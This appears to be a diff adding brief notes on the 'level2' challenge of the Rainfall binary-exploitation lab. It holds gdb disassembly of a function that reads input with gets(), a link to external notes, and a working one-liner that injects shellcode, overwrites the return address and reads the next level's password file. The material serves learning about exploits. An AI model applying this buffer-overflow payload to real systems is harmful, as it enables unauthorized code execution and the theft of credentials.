@@ -1,0 +1,35 @@
+0x80484d4 <p>                   push   %ebp                     
+0x80484d5 <p+1>                 mov    %esp,%ebp                
+0x80484d7 <p+3>                 sub    $0x68,%esp               
+0x80484da <p+6>                 mov    0x8049860,%eax           
+0x80484df <p+11>                mov    %eax,(%esp)              
+0x80484e2 <p+14>                call   0x80483b0 <fflush@plt>   
+0x80484e7 <p+19>                lea    -0x4c(%ebp),%eax         
+0x80484ea <p+22>                mov    %eax,(%esp)              
+0x80484ed <p+25>                call   0x80483c0 <gets@plt>     
+0x80484f2 <p+30>                mov    0x4(%ebp),%eax           
+0x80484f5 <p+33>                mov    %eax,-0xc(%ebp)          
+0x80484f8 <p+36>                mov    -0xc(%ebp),%eax          
+0x80484fb <p+39>                and    $0xb0000000,%eax         
+0x8048500 <p+44>                cmp    $0xb0000000,%eax         
+0x8048505 <p+49>                jne    0x8048527 <p+83>         
+0x8048507 <p+51>                mov    $0x8048620,%eax          
+0x804850c <p+56>                mov    -0xc(%ebp),%edx          
+0x804850f <p+59>                mov    %edx,0x4(%esp)           
+0x8048513 <p+63>                mov    %eax,(%esp)              
+0x8048516 <p+66>                call   0x80483a0 <printf@plt>   
+0x804851b <p+71>                movl   $0x1,(%esp)              
+0x8048522 <p+78>                call   0x80483d0 <_exit@plt>    
+0x8048527 <p+83>                lea    -0x4c(%ebp),%eax         
+0x804852a <p+86>                mov    %eax,(%esp)              
+0x804852d <p+89>                call   0x80483f0 <puts@plt>     
+0x8048532 <p+94>                lea    -0x4c(%ebp),%eax         
+0x8048535 <p+97>                mov    %eax,(%esp)              
+0x8048538 <p+100>               call   0x80483e0 <strdup@plt>   
+0x804853d <p+105>               leave                                                                                                                                                                       
+0x804853e <p+106>               ret              
+
+
+pourquoi : https://github.com/ForAbby-X/rainfall/blob/main/rainfall.txt
+
+(python -c "print('\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x2f\x10\xe2\xaf\xc9\xc3\x00' + '\x00' * (64 + 16 - 42) + '\x08\xa0\x04\x08')" ; echo "cat /home/user/level3/.pass") | ./level2
